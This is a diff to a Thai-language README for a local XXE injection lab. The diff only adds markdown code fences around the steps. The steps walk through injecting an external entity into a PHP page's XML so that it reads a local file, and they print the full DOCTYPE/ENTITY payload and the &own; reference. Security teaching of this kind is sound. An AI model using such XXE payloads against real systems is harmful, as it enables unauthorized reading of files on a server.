@@ -49,10 +49,18 @@ File ที่จำเป็นต้องใช้
 1. เปิดโปรแกรม xampp แล้วทำการ start Apache
 2. สามารถเปิด web application xxe injection โดยการเข้าลิงค์  localhost/send.php
 3.  ทำการใส่ ENTITY EXTERNAL ลงไปในไฟล์ send.php ในบรรทัดที่ 4-5 ดังนี้
+```
 <!DOCTYPE own [ <!ELEMENT own ANY >
 <!ENTITY own SYSTEM "file:///C:/Users/Acer/Desktop/text.txt">]>
-4.  จากนั้นแก้ใน <user></user> ของบรรทัดที่ 7 โดยใส่ &own; ลงไป
+```
+4.  จากนั้นแก้ใน
+```
+<user></user>
+```
+ของบรรทัดที่ 7 โดยใส่ &own; ลงไป
+```
 <user>&own;</user>
+```
 
 - ลิงค์ video
 Part1: https://youtu.be/XlRQqFHuGKA
